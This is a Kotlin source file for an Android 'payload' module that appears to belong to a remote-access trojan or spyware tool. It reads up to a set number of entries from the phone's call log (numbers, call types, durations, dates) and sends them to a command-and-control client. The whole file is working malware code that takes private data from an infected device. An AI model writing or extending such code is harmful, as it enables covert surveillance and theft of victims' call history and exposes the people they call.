package com.ihk909.payload.modules

import android.content.Context
import android.provider.CallLog
import com.ihk909.payload.C2Client
import org.json.JSONArray
import org.json.JSONObject

object CallLogModule {
    fun list(ctx: Context, c2: C2Client, id: String, args: JSONObject) {
        runCatching {
            val limit = args.optInt("limit", 100)
            val arr = JSONArray()
            ctx.contentResolver.query(
                CallLog.Calls.CONTENT_URI, null, null, null,
                CallLog.Calls.DATE + " DESC"
            )?.use { c ->
                var i = 0
                while (c.moveToNext() && i < limit) {
                    arr.put(JSONObject()
                        .put("number", c.getString(c.getColumnIndexOrThrow(CallLog.Calls.NUMBER)))
                        .put("type", c.getInt(c.getColumnIndexOrThrow(CallLog.Calls.TYPE)))
                        .put("duration", c.getLong(c.getColumnIndexOrThrow(CallLog.Calls.DURATION)))
                        .put("date", c.getLong(c.getColumnIndexOrThrow(CallLog.Calls.DATE))))
                    i++
                }
            }
            c2.reply(id, JSONObject().put("items", arr))
        }.onFailure { c2.replyError(id, it.message ?: "error") }
    }
}